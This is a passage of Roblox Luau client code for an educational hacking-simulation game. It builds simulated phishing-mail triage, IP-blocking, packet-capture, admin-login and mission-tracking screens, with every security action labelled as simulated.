Position = UDim2.new(0, 10, 0, 10),
Size = UDim2.new(1, -20, 0, 24),
TextXAlignment = Enum.TextXAlignment.Left,
})
mk("TextLabel", {
Parent = mailPage,
Name = "MailInboxSummary",
BackgroundTransparency = 1,
TextWrapped = true,
Text = "Open messages from the left inbox queue, then classify each one before the incident escalates.",
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.fromRGB(88, 98, 114),
Position = UDim2.new(0, 10, 0, 36),
Size = UDim2.new(1, -20, 0, 24),
TextXAlignment = Enum.TextXAlignment.Left,
TextYAlignment = Enum.TextYAlignment.Top,
})
mk("ScrollingFrame", {
Parent = mailPage,
Name = "MailInboxList",
BackgroundColor3 = Color3.fromRGB(239, 243, 248),
BorderSizePixel = 0,
Position = UDim2.new(0, 10, 0, 70),
Size = UDim2.new(0.44, -16, 1, -80),
CanvasSize = UDim2.new(0, 0, 0, 0),
AutomaticCanvasSize = Enum.AutomaticSize.Y,
ScrollBarThickness = 6,
ScrollBarImageColor3 = Color3.fromRGB(152, 160, 173),
})
round(mailPage:FindFirstChild("MailInboxList"), 10)
mk("UIListLayout", {
Parent = mailPage.MailInboxList,
Name = "UIListLayout",
Padding = UDim.new(0, 6),
SortOrder = Enum.SortOrder.LayoutOrder,
})
mk("Frame", {
Parent = mailPage,
Name = "MailDetailCard",
BackgroundColor3 = Color3.fromRGB(238, 242, 248),
BorderSizePixel = 0,
ClipsDescendants = true,
Position = UDim2.new(0.44, -2, 0, 70),
Size = UDim2.new(0.56, -8, 1, -80),
})
round(mailPage:FindFirstChild("MailDetailCard"), 10)
mk("TextLabel", {
Parent = mailPage.MailDetailCard,
Name = "MailDetailSender",
BackgroundTransparency = 1,
TextWrapped = true,
Text = "FROM:",
Font = Enum.Font.Code,
TextSize = 13,
TextColor3 = Color3.fromRGB(55, 64, 80),
TextXAlignment = Enum.TextXAlignment.Left,
TextYAlignment = Enum.TextYAlignment.Top,
Position = UDim2.new(0, 14, 0, 12),
Size = UDim2.new(1, -28, 0, 22),
})
mk("TextLabel", {
Parent = mailPage.MailDetailCard,
Name = "MailDetailSubject",
BackgroundTransparency = 1,
TextWrapped = true,
Text = "SUBJECT:",
Font = Enum.Font.GothamBold,
TextSize = 15,
TextColor3 = Color3.fromRGB(25, 30, 38),
TextXAlignment = Enum.TextXAlignment.Left,
TextYAlignment = Enum.TextYAlignment.Top,
Position = UDim2.new(0, 14, 0, 38),
Size = UDim2.new(1, -28, 0, 40),
})
mk("ScrollingFrame", {
Parent = mailPage.MailDetailCard,
Name = "MailDetailBodyFrame",
BackgroundColor3 = Color3.fromRGB(248, 250, 253),
BorderSizePixel = 0,
Position = UDim2.new(0, 14, 0, 84),
Size = UDim2.new(1, -28, 0, 186),
CanvasSize = UDim2.new(0, 0, 0, 0),
AutomaticCanvasSize = Enum.AutomaticSize.Y,
ScrollBarThickness = 5,
ScrollBarImageColor3 = Color3.fromRGB(152, 160, 173),
ScrollingDirection = Enum.ScrollingDirection.Y,
ClipsDescendants = true,
})
round(mailPage.MailDetailCard.MailDetailBodyFrame, 8)
mk("TextLabel", {
Parent = mailPage.MailDetailCard.MailDetailBodyFrame,
Name = "MailDetailBody",
BackgroundTransparency = 1,
AutomaticSize = Enum.AutomaticSize.Y,
TextWrapped = true,
TextYAlignment = Enum.TextYAlignment.Top,
Text = "Select a message from the inbox to inspect it.",
Font = Enum.Font.Gotham,
TextSize = 14,
TextColor3 = Color3.fromRGB(48, 56, 70),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 10),
Size = UDim2.new(1, -20, 0, 0),
})
mk("TextLabel", {
Parent = mailPage.MailDetailCard,
Name = "MailStatusLabel",
BackgroundTransparency = 1,
TextWrapped = true,
Text = "Review the selected message before deciding whether it should be reported.",
Font = Enum.Font.GothamBold,
TextSize = 13,
TextColor3 = Color3.fromRGB(176, 92, 42),
TextXAlignment = Enum.TextXAlignment.Left,
TextYAlignment = Enum.TextYAlignment.Top,
Position = UDim2.new(0, 14, 0, 278),
Size = UDim2.new(1, -28, 0, 48),
})
mk("TextButton", {
Parent = mailPage.MailDetailCard,
Name = "MailReportButton",
BackgroundColor3 = Color3.fromRGB(184, 61, 61),
BorderSizePixel = 0,
Text = "Report",
Font = Enum.Font.GothamBold,
TextSize = 13,
TextColor3 = Color3.new(1, 1, 1),
Position = UDim2.new(0, 14, 0, 332),
Size = UDim2.new(0, 112, 0, 34),
AutoButtonColor = true,
})
round(mailPage.MailDetailCard.MailReportButton, 8)
mk("TextButton", {
Parent = mailPage.MailDetailCard,
Name = "MailPassButton",
BackgroundColor3 = Color3.fromRGB(63, 142, 96),
BorderSizePixel = 0,
Text = "Pass Through",
Font = Enum.Font.GothamBold,
TextSize = 13,
TextColor3 = Color3.new(1, 1, 1),
Position = UDim2.new(0, 134, 0, 332),
Size = UDim2.new(0, 132, 0, 34),
AutoButtonColor = true,
})
round(mailPage.MailDetailCard.MailPassButton, 8)
mk("TextLabel", {
Parent = mailPage.MailDetailCard,
Name = "MailActionHintLabel",
BackgroundTransparency = 1,
TextWrapped = true,
Text = "Report phishing mail. Pass Through legitimate internal mail.",
Font = Enum.Font.Gotham,
TextSize = 12,
TextColor3 = Color3.fromRGB(92, 100, 114),
TextXAlignment = Enum.TextXAlignment.Left,
TextYAlignment = Enum.TextYAlignment.Top,
Position = UDim2.new(0, 14, 0, 372),
Size = UDim2.new(1, -28, 0, 44),
})
if mailPage.MailDetailCard:FindFirstChild("MailReportButton") then
mailPage.MailDetailCard.MailReportButton.MouseButton1Click:Connect(function()
if browserState._classifySelectedMail then
browserState._classifySelectedMail("report")
end
end)
end
if mailPage.MailDetailCard:FindFirstChild("MailPassButton") then
mailPage.MailDetailCard.MailPassButton.MouseButton1Click:Connect(function()
if browserState._classifySelectedMail then
browserState._classifySelectedMail("pass")
end
end)
end
local ipBlockerPage = mk("Frame", {
Parent = BrowserContent,
Name = "IPBlockerPage",
BackgroundTransparency = 1,
Size = UDim2.fromScale(1, 1),
Visible = false,
})
mk("TextLabel", {
Parent = ipBlockerPage,
BackgroundTransparency = 1,
Text = "RBXIPBlocker",
Font = Enum.Font.GothamBlack,
TextSize = 24,
TextColor3 = Color3.fromRGB(30, 40, 58),
Position = UDim2.new(0, 10, 0, 10),
Size = UDim2.new(1, -20, 0, 28),
TextXAlignment = Enum.TextXAlignment.Left,
})
mk("TextLabel", {
Parent = ipBlockerPage,
BackgroundTransparency = 1,
Text = "Emergency hostile source blocking console (SIM)",
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.fromRGB(88, 98, 114),
Position = UDim2.new(0, 10, 0, 36),
Size = UDim2.new(1, -20, 0, 18),
TextXAlignment = Enum.TextXAlignment.Left,
})
local ipBlockerToolbar = mk("Frame", {
Parent = ipBlockerPage,
BackgroundColor3 = Color3.fromRGB(233, 237, 244),
BorderSizePixel = 0,
Position = UDim2.new(0, 10, 0, 62),
Size = UDim2.new(1, -20, 0, 48),
})
round(ipBlockerToolbar, 8)
local ipBlockerInputBox = mk("TextBox", {
Parent = ipBlockerToolbar,
Name = "IPBlockerInputBox",
Text = "",
PlaceholderText = "Enter source IP to block",
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.new(0, 0, 0),
BackgroundColor3 = Color3.fromRGB(248, 250, 253),
BorderSizePixel = 0,
Position = UDim2.new(0, 8, 0, 9),
Size = UDim2.new(1, -126, 0, 30),
})
round(ipBlockerInputBox, 8)
local ipBlockerBlockBtn = mk("TextButton", {
Parent = ipBlockerToolbar,
Name = "IPBlockerBlockBtn",
Text = "Block",
Font = Enum.Font.GothamBold,
TextSize = 13,
TextColor3 = Color3.new(1, 1, 1),
BackgroundColor3 = Color3.fromRGB(188, 62, 62),
Position = UDim2.new(1, -110, 0, 9),
Size = UDim2.new(0, 102, 0, 30),
})
round(ipBlockerBlockBtn, 8)
local ipBlockerStatus = mk("TextLabel", {
Parent = ipBlockerPage,
Name = "IPBlockerStatus",
BackgroundTransparency = 1,
Text = "Enter a hostile source from the investigation feed.",
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.fromRGB(88, 98, 114),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 118),
Size = UDim2.new(1, -20, 0, 18),
})
local ipBlockerHistoryFrame = mk("ScrollingFrame", {
Parent = ipBlockerPage,
Name = "IPBlockerHistoryFrame",
BackgroundColor3 = Color3.fromRGB(238, 242, 248),
BorderSizePixel = 0,
ScrollBarThickness = 6,
Position = UDim2.new(0, 10, 0, 144),
Size = UDim2.new(1, -20, 1, -154),
})
round(ipBlockerHistoryFrame, 8)
mk("UIListLayout", {
Parent = ipBlockerHistoryFrame,
Name = "UIListLayout",
Padding = UDim.new(0, 6),
SortOrder = Enum.SortOrder.LayoutOrder,
})
goBtn.MouseButton1Click:Connect(function()
navigateTo(UrlBox.Text)
end)
local function tryAdminLogin()
local u = tostring((AdminUserBox.Text or ""):lower())
local p = tostring(AdminPassBox:GetAttribute("RealPassword") or "")
if u == "bloxplay-admin" and p == "blox123" then
local result = submitScenarioAction("browser_admin_login bloxplay.com/admin", { "ch2_admin_login" })
browserState.adminLoggedIn = true
browserState.adminTab = "database"
Player:SetAttribute("Obj_Admin", true)
AdminLoginStatus.Text = "Login successful (sim)"
AdminPassBox.Text = ""
AdminPassBox:SetAttribute("RealPassword", "")
navigateTo("bloxplay.com/admin")
if result and result.success then
setBrowserStatus("Admin login accepted. Mission step complete.")
end
else
AdminLoginStatus.Text = "Access denied (sim)"
AdminPassBox.Text = ""
AdminPassBox:SetAttribute("RealPassword", "")
end
end
adminLoginBtn.MouseButton1Click:Connect(tryAdminLogin)
adminDatabaseTabBtn.MouseButton1Click:Connect(function()
browserState.adminTab = "database"
showAdminDashboard("bloxplay.com/admin")
setBrowserStatus("Database records open (sim).")
end)
adminLogsTabBtn.MouseButton1Click:Connect(function()
local result = submitScenarioAction("browser_admin_tab logs", { "ch3_admin_logs" })
browserState.adminTab = "logs"
browserState.logsLastRender = 0
showAdminDashboard("bloxplay.com/admin")
if result and result.success then
setBrowserStatus("Security logs opened. Mission step complete.")
else
setBrowserStatus("Security logs open (live feed).")
end
end)
AdminSearchBox:GetPropertyChangedSignal("Text"):Connect(function()
if browserState.adminTab ~= "logs" then
renderAdminResults(AdminSearchBox.Text)
end
end)
ipBlockerBlockBtn.MouseButton1Click:Connect(function()
local ip = tostring(ipBlockerInputBox.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
if ip == "" then
ipBlockerStatus.Text = "Enter a hostile source first."
setBrowserStatus("RBXIPBlocker needs a source IP.")
return
end
local alreadyBlocked = false
if type(browserState.blockedIPs) ~= "table" then
browserState.blockedIPs = {}
end
for _, existing in ipairs(browserState.blockedIPs) do
if existing == ip then
alreadyBlocked = true
break
end
end
if not alreadyBlocked then
table.insert(browserState.blockedIPs, ip)
table.sort(browserState.blockedIPs)
end
renderIPBlockerHistory()
local result = submitScenarioAction(("browser_ipblocker_block %s"):format(ip), { "ch4_block_source" })
ipBlockerInputBox.Text = ""
ipBlockerStatus.Text = alreadyBlocked and ("Source %s was already blocked."):format(ip) or (("Source %s blocked (sim)."):format(ip))
if result and result.success then
if ip == WANNAWAIL_ATTACKER_IP then
if browserState._markWannaWailFlag then
		browserState._markWannaWailFlag(WANNAWAIL_ATTR_SOURCE_BLOCKED, true)
	end
end
setBrowserStatus(("RBXIPBlocker blocked %s. Mission step complete."):format(ip))
else
setBrowserStatus(("RBXIPBlocker blocked %s (sim)"):format(ip))
end
end)
PacketApplyBtn.MouseButton1Click:Connect(function()
local ip = tostring(PacketIPBox.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
local result = submitScenarioAction(("browser_capture %s"):format(ip ~= "" and ip or "unknown"), { "ch1_packets" })
if startPacketCaptureForIP(ip) then
populatePacketRows()
local host = getHostByIP(ip)
if result and result.success then
setBrowserStatus(("Capture verified for %s [%s]. Mission step complete."):format(host.label, host.ip))
else
setBrowserStatus(("Capturing packets for %s [%s] (sim)"):format(host.label, host.ip))
end
else
populatePacketRows()
setBrowserStatus("Unknown IP. No simulated capture available.")
end
end)
PacketClearBtn.MouseButton1Click:Connect(function()
if PacketIPBox then PacketIPBox.Text = "" end
if PacketDNSBox then PacketDNSBox.Text = "" end
ActivePacketCapture.targetIP = ""
ActivePacketCapture.targetLabel = ""
ActivePacketCapture.rows = {}
populatePacketRows()
setBrowserStatus("RBXPacketNet filters cleared (sim)")
end)
PacketFollowBtn.MouseButton1Click:Connect(function()
if PacketIPBox.Text == "" then
PacketIPBox.Text = "192.168.32.12"
end
startPacketCaptureForIP(PacketIPBox.Text)
if PacketDNSBox.Text == "" then
PacketDNSBox.Text = "admin"
end
populatePacketRows()
setBrowserStatus("Following simulated traffic stream.")
end)
UIS.InputBegan:Connect(function(input, gameProcessed)
	if MainGUI and MainGUI.Enabled then
		browserState._markInteraction()
	end
if gameProcessed then return end
if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
if input.KeyCode == Enum.KeyCode.Up then
local focused = nil
pcall(function() focused = UIS:GetFocusedTextBox() end)
if focused == TermInput then
historyUp()
end
return
elseif input.KeyCode == Enum.KeyCode.Down then
local focused = nil
pcall(function() focused = UIS:GetFocusedTextBox() end)
if focused == TermInput then
historyDown()
end
return
end
if input.KeyCode ~= Enum.KeyCode.Return and input.KeyCode ~= Enum.KeyCode.KeypadEnter then
return
end
local focused = nil
pcall(function() focused = UIS:GetFocusedTextBox() end)
if focused == UrlBox then
navigateTo(UrlBox.Text)
elseif focused == AdminPassBox or focused == AdminUserBox then
if AdminLoginPage and AdminLoginPage.Visible then
tryAdminLogin()
end
elseif focused == PacketIPBox or focused == PacketDNSBox then
if PacketPage and PacketPage.Visible then
if PacketIPBox.Text ~= "" then
startPacketCaptureForIP(PacketIPBox.Text)
end
populatePacketRows()
end
end
end)
UrlBox.FocusLost:Connect(function(enterPressed)
	if MainGUI and MainGUI.Enabled then
		browserState._markInteraction()
	end
if enterPressed then
navigateTo(UrlBox.Text)
end
end)
local function canRefocusTerminal()
if not (MainGUI and MainGUI.Enabled) then return false end
if not (TermFrame and TermFrame.Visible) then return false end
if not (TermInput and TermInput.Parent) then return false end
if not (isToolEquipped() and started) then return false end
local focused = nil
pcall(function() focused = UIS:GetFocusedTextBox() end)
return focused == nil or focused == TermInput
end
TermInput:GetPropertyChangedSignal("Text"):Connect(function()
if historyIndex == nil then
currentDraft = TermInput.Text
end
end)
TermInput.FocusLost:Connect(function(enter)
	if MainGUI and MainGUI.Enabled then
		browserState._markInteraction()
	end
if enter then
local c = TermInput.Text
TermInput.Text = ""
pushHistory(c)
handle(c)
end
task.defer(function()
if canRefocusTerminal() then
TermInput:CaptureFocus()
end
end)
end)
bTerm.MouseButton1Click:Connect(function()
TermFrame.Visible = true
BrowserFrame.Visible = false
MissionsFrame.Visible = false
TermInput:CaptureFocus()
end)
bBrowser.MouseButton1Click:Connect(function()
TermFrame.Visible = false
BrowserFrame.Visible = true
MissionsFrame.Visible = false
if UrlBox and UrlBox.Text == "" then
UrlBox.Text = "home"
navigateTo("home")
else
navigateTo(UrlBox.Text)
end
pcall(function() UrlBox:CaptureFocus() end)
end)
bMissions.MouseButton1Click:Connect(function()
TermFrame.Visible = false
BrowserFrame.Visible = false
MissionsFrame.Visible = true
end)
task.defer(function()
if browserState._renderMailPage then
browserState._renderMailPage()
end
end)
addLine(PROMPT)
return gui
end
-- Boot splash with a real loading bar
local function playStart(onDone)
teardownStart()
local blur = mk("BlurEffect", { Parent = Lighting, Name = BLUR_NAME, Size = 12 })
local gui = mk("ScreenGui", { Parent = PlayerGui, Name = "HackStart", IgnoreGuiInset = true, ResetOnSpawn = false })
local bg = mk("Frame", { Parent = gui, Size = UDim2.fromScale(1, 1), BackgroundColor3 = Color3.fromRGB(8, 10, 14) })
mk("UIGradient", {
Parent = bg,
Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 20, 40)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 10, 14)),
}),
Rotation = 45,
})
local card = mk("Frame", {
Parent = bg,
Size = UDim2.fromOffset(420, 280),
Position = UDim2.fromScale(0.5, 0.5),
AnchorPoint = Vector2.new(0.5, 0.5),
BackgroundColor3 = Color3.fromRGB(16, 22, 35),
})
round(card, 18)
mk("UIStroke", {
Parent = card,
Color = Color3.fromRGB(100, 150, 255),
Thickness = 2,
Transparency = 0.3,
})
mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
Text = "HACKTABLET OS",
Font = Enum.Font.GothamBlack,
TextSize = 32,
TextColor3 = Color3.fromRGB(220, 235, 255),
Size = UDim2.new(1, 0, 0, 50),
Position = UDim2.new(0, 0, 0, 20),
})
mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
Text = "Initializing security system...",
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.fromRGB(150, 170, 200),
Size = UDim2.new(1, 0, 0, 20),
Position = UDim2.new(0, 0, 0, 80),
})
local percentLabel = mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
Text = "000%",
Font = Enum.Font.Code,
TextSize = 20,
TextColor3 = Color3.fromRGB(198, 219, 255),
Size = UDim2.new(1, -56, 0, 28),
Position = UDim2.new(0, 28, 0, 122),
TextXAlignment = Enum.TextXAlignment.Right,
})
local barTrack = mk("Frame", {
Parent = card,
BackgroundColor3 = Color3.fromRGB(29, 39, 60),
BorderSizePixel = 0,
Size = UDim2.new(1, -56, 0, 22),
Position = UDim2.new(0, 28, 0, 158),
})
round(barTrack, 11)
local trackStroke = mk("UIStroke", {
Parent = barTrack,
Color = Color3.fromRGB(77, 108, 171),
Transparency = 0.4,
Thickness = 1,
})
local barFill = mk("Frame", {
Parent = barTrack,
BackgroundColor3 = Color3.fromRGB(95, 154, 255),
BorderSizePixel = 0,
Size = UDim2.new(0, 0, 1, 0),
})
round(barFill, 11)
local fillGradient = mk("UIGradient", {
Parent = barFill,
Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(66, 120, 238)),
ColorSequenceKeypoint.new(0.5, Color3.fromRGB(143, 197, 255)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(66, 120, 238)),
}),
Rotation = 0,
})
local statusLabel = mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
Text = "Loading secure modules...",
Font = Enum.Font.Gotham,
TextSize = 14,
TextColor3 = Color3.fromRGB(156, 181, 221),
Size = UDim2.new(1, -56, 0, 22),
Position = UDim2.new(0, 28, 0, 191),
TextXAlignment = Enum.TextXAlignment.Left,
})
local footer = mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
Text = "SIMULATED DEVICE BOOT",
Font = Enum.Font.Code,
TextSize = 12,
TextColor3 = Color3.fromRGB(111, 132, 170),
Size = UDim2.new(1, -56, 0, 18),
Position = UDim2.new(0, 28, 1, -34),
TextXAlignment = Enum.TextXAlignment.Left,
})
local duration = 1.8
local steps = {
{ at = 0.0, text = "Loading secure modules..." },
{ at = 0.3, text = "Authenticating user profile..." },
{ at = 0.62, text = "Syncing terminal workspace..." },
{ at = 0.85, text = "Establishing secure link..." },
}
local cancelled = false
gui.Destroying:Connect(function()
cancelled = true
end)
local fillTween = Tween:Create(barFill, TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
Size = UDim2.new(1, 0, 1, 0),
})
fillTween:Play()
local shimmerTween = Tween:Create(fillGradient, TweenInfo.new(0.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), {
Offset = Vector2.new(0.35, 0),
})
shimmerTween:Play()
local startTime = tick()
task.spawn(function()
while not cancelled and gui.Parent and card.Parent do
local alpha = math.clamp((tick() - startTime) / duration, 0, 1)
local percent = math.floor(alpha * 100 + 0.5)
percentLabel.Text = string.format("%03d%%", percent)
for i = #steps, 1, -1 do
if alpha >= steps[i].at then
statusLabel.Text = steps[i].text
break
end
end
if alpha >= 1 then
break
end
task.wait(0.03)
end
end)
task.delay(duration, function()
if cancelled or not gui.Parent then
return
end
percentLabel.Text = "100%"
statusLabel.Text = "Secure link established."
shimmerTween:Cancel()
trackStroke.Transparency = 0.7
fillGradient.Offset = Vector2.new(0, 0)
Tween:Create(card, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
BackgroundTransparency = 1,
}):Play()
Tween:Create(barTrack, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
BackgroundTransparency = 1,
}):Play()
Tween:Create(barFill, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
BackgroundTransparency = 1,
}):Play()
Tween:Create(percentLabel, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
TextTransparency = 1,
}):Play()
Tween:Create(statusLabel, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
TextTransparency = 1,
}):Play()
Tween:Create(footer, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
TextTransparency = 1,
}):Play()
Tween:Create(blur, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
Size = 0,
}):Play()
task.delay(0.35, function()
if gui.Parent then
gui:Destroy()
end
if blur.Parent then
blur:Destroy()
end
if not cancelled and onDone then
onDone()
end
end)
end)
end
local function buildHint()
local gui = mk("ScreenGui", {
Parent = PlayerGui,
Name = "TabletHint",
IgnoreGuiInset = true,
ResetOnSpawn = false,
Enabled = false,
})
local shade = mk("Frame", {
Parent = gui,
Size = UDim2.fromScale(1, 1),
BackgroundColor3 = Color3.fromRGB(5, 8, 12),
BackgroundTransparency = 0.3,
})
local panel = mk("Frame", {
Parent = shade,
BackgroundColor3 = Color3.fromRGB(15, 20, 32),
Size = UDim2.fromOffset(430, 190),
Position = UDim2.fromScale(0.5, 0.62),
AnchorPoint = Vector2.new(0.5, 0.5),
})
round(panel, 16)
mk("TextLabel", {
Parent = panel,
BackgroundTransparency = 1,
Font = Enum.Font.GothamBlack,
TextSize = 28,
TextColor3 = Color3.fromRGB(225, 235, 255),
Text = "HackOS Tablet",
Size = UDim2.new(1, 0, 0, 36),
Position = UDim2.new(0, 0, 0, 16),
})
mk("TextLabel", {
Parent = panel,
BackgroundTransparency = 1,
Font = Enum.Font.Gotham,
TextSize = 16,
TextColor3 = Color3.fromRGB(180, 200, 230),
TextWrapped = true,
Text = UIS.TouchEnabled and "Tap START to boot." or "Click START to boot.",
Size = UDim2.new(1, -40, 0, 42),
Position = UDim2.new(0, 20, 0, 60),
})
local startBtn = mk("TextButton", {
Parent = panel,
Text = "START",
Font = Enum.Font.GothamSemibold,
TextSize = 18,
TextColor3 = Color3.new(1, 1, 1),
BackgroundColor3 = Color3.fromRGB(79, 131, 255),
Size = UDim2.fromOffset(210, 42),
Position = UDim2.new(0.5, -105, 1, -58),
})
round(startBtn, 12)
startBtn.MouseButton1Click:Connect(function()
	browserState._markInteraction()
if not isToolEquipped() then
gui.Enabled = false
return
end
gui.Enabled = false
playStart(function()
if isToolEquipped() and MainGUI then
resetUI()
MainGUI.Enabled = true
started = true
playAudio()
if browserState._ensureChapter3MailVisible then
browserState._ensureChapter3MailVisible()
end
if TermInput and not (BrowserFrame and BrowserFrame.Visible) then TermInput:CaptureFocus() end
else
stopAudio()
end
end)
end)
return gui
end
local function allowE()
return isToolEquipped() and started and MainGUI and MainGUI.Enabled
end
function bindEGuard()
CAS:UnbindAction(E_BIND)
CAS:BindActionAtPriority(E_BIND, function(_, state)
if state ~= Enum.UserInputState.Begin then
return Enum.ContextActionResult.Pass
end
return allowE() and Enum.ContextActionResult.Sink or Enum.ContextActionResult.Pass
end, false, Enum.ContextActionPriority.High.Value, Enum.KeyCode.E)
end
local function renderMissionCards(objectivesList)
	if not MissionsList then return end
	objectivesList = type(objectivesList) == "table" and objectivesList or {}

	-- Clear previous mission cards
	for _, child in ipairs(MissionsList:GetChildren()) do
		if child:IsA("Frame") then
			child:Destroy()
		end
	end

	for _, taskInfo in ipairs(objectivesList) do
		local taskRow = mk("Frame", {
			Parent = MissionsList,
			BackgroundColor3 = Color3.fromRGB(20, 26, 38),
			Size = UDim2.new(1, -10, 0, 50),
		})
		round(taskRow, 8)

		local textColor = Color3.new(1, 1, 1)
		if taskInfo.status == "Completed" then
			textColor = Color3.fromRGB(160, 160, 160)
		end
		local label = mk("TextLabel", {
			Parent = taskRow,
			BackgroundTransparency = 1,
			Text = taskInfo.text,
			Font = Enum.Font.GothamSemibold,
			TextSize = 14,
			TextColor3 = textColor,
			Position = UDim2.new(0, 10, 0, 5),
			Size = UDim2.new(1, -20, 0, 20),
			TextXAlignment = Enum.TextXAlignment.Left,
		})
		if taskInfo.status == "Completed" then
			mk("Frame", {
				Parent = label,
				BackgroundColor3 = Color3.fromRGB(160, 160, 160),
				BorderSizePixel = 0,
				Size = UDim2.new(1, 0, 0, 2),
				Position = UDim2.new(0, 0, 0.5, -1),
			})
		end

		local statusColor = Color3.fromRGB(150, 150, 150)
		if taskInfo.status == "Completed" then
			statusColor = Color3.fromRGB(0, 255, 100)
		elseif taskInfo.status == "In Progress" then
			statusColor = Color3.fromRGB(255, 200, 0)
		elseif taskInfo.status == "Locked" then
			statusColor = Color3.fromRGB(140, 140, 140)
		end

		mk("TextLabel", {
			Parent = taskRow,
			BackgroundTransparency = 1,
			Text = string.upper(taskInfo.status),
			Font = Enum.Font.GothamBold,
			TextSize = 12,
			TextColor3 = statusColor,
			Position = UDim2.new(0, 10, 0, 25),
			Size = UDim2.new(1, -20, 0, 20),
			TextXAlignment = Enum.TextXAlignment.Left,
		})
	end

	task.defer(function()
		local layout = MissionsList:FindFirstChild("UIListLayout")
		if layout then
			MissionsList.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
		end
	end)
end

local function getObjectiveStatusText(status)
	if status == "Locked" then
		return "Locked"
	elseif status == "Completed" then
		return "Completed"
	elseif status == "In Progress" then
		return "In Progress"
	end
	return "Unlocked"
end

local function getObjectiveStatusColor(status)
	if status == "Locked" then
		return Color3.fromRGB(140, 140, 140)
	elseif status == "Completed" then
		return Color3.fromRGB(0, 255, 100)
	elseif status == "In Progress" then
		return Color3.fromRGB(255, 200, 0)
	end
	return Color3.new(1, 1, 1)
end

local function buildFallbackChapterObjectives()
	local chapters = {}
	for _, scenarioId in ipairs({
		"Chapter1_Recon",
		"Chapter2_SSH",
		"Chapter3_Malware",
		"Chapter4_IncidentResponse",
	}) do
		local scenario = ScenarioData[scenarioId]
		if scenario then
			local unlocked = scenarioId == "Chapter1_Recon"
			local chapterStatus = unlocked and "Unlocked" or "Locked"
			local steps = {}
			for _, step in ipairs(scenario.steps or {}) do
				table.insert(steps, {
					text = step.instruction or "Step",
					status = unlocked and "Not Started" or "Locked",
				})
			end
			table.insert(chapters, {
				id = scenarioId,
				title = scenario.title,
				status = chapterStatus,
				steps = steps,
			})
		end
	end
	return chapters
end

local function normalizeChapterObjectives(rawObjectives)
	-- Only use objectives from the server; never fallback to static list
	if type(rawObjectives) ~= "table" or #rawObjectives == 0 then
		return {} -- Show nothing if no real data
	end
	local normalized = {}
	for _, chapter in ipairs(rawObjectives) do
		if type(chapter) == "table" and chapter.title then
			table.insert(normalized, chapter)
		end
	end
	return normalized
end


function renderObjectiveCards(objectivesList)
    if not ObjectivesList then return end
    -- print("Rendering objectives:", #objectivesList, "chapters")
    objectivesList = normalizeChapterObjectives(objectivesList)

	-- Clear previous objective cards
	for _, child in ipairs(ObjectivesList:GetChildren()) do
		if child:IsA("Frame") then
			child:Destroy()
		end
	end

	for _, chapter in ipairs(objectivesList) do
		local card = mk("Frame", {
			Parent = ObjectivesList,
			BackgroundColor3 = Color3.fromRGB(20, 26, 38),
			Size = UDim2.new(1, -10, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
		})
		round(card, 10)

		local header = mk("TextButton", {
			Parent = card,
			BackgroundTransparency = 1,
			Size = UDim2.new(1, 0, 0, 44),
			AutoButtonColor = false,
			Text = "",
		})

		local titleLabel = mk("TextLabel", {
			Parent = header,
			BackgroundTransparency = 1,
			Text = chapter.title,
			Font = Enum.Font.GothamSemibold,
			TextSize = 15,
			TextColor3 = chapter.status == "Completed" and Color3.fromRGB(160,160,160) or Color3.new(1,1,1),
			Position = UDim2.new(0, 10, 0, 8),
			Size = UDim2.new(0.5, -10, 0, 28),
			TextXAlignment = Enum.TextXAlignment.Left,
		})
		if chapter.status == "Completed" then
			mk("Frame", {
				Parent = titleLabel,
				BackgroundColor3 = Color3.fromRGB(160, 160, 160),
				BorderSizePixel = 0,
				Size = UDim2.new(1, 0, 0, 2),
				Position = UDim2.new(0, 0, 0.5, -1),
			})
		end

		local startBtn = nil
		if chapter.status == "Not Started" and chapter.unlocked then
			startBtn = mk("TextButton", {
				Parent = header,
				Text = "Start",
				Font = Enum.Font.GothamBold,
				TextSize = 13,
				TextColor3 = Color3.new(1,1,1),
				BackgroundColor3 = Color3.fromRGB(79, 131, 255),
				Size = UDim2.new(0, 60, 0, 28),
				Position = UDim2.new(0.52, 0, 0, 8),
			})
			round(startBtn, 8)
			startBtn.MouseButton1Click:Connect(function()
				local remotes = game:GetService("ReplicatedStorage"):WaitForChild("Remotes")
				local loadScenario = remotes:FindFirstChild("LoadScenario")
				if loadScenario then
					loadScenario:InvokeServer(chapter.id)
				end
			end)
		end

		local statusLabel = mk("TextLabel", {
			Parent = header,
			BackgroundTransparency = 1,
			Text = string.upper(getObjectiveStatusText(chapter.status)),
			Font = Enum.Font.GothamBold,
			TextSize = 13,
